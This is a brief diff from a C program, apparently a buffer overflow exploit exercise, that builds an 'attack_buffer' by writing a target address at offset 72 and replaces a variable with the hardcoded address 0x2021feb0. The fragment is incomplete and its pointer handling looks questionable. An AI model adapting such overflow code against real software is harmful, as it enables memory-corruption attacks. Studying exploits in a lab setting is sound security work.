@@ -36,7 +36,7 @@ main ( int argc, char * argv[] )
 	*a = target;
 	// memset(&attack_buffer[120], target, 4);
 
-	char *ptr = (char*)target;
+	char *ptr = (char*)0x2021feb0;
 
 	for(int i=0;i<6;i++){
     	*(attack_buffer+72+i) = ptr[i];
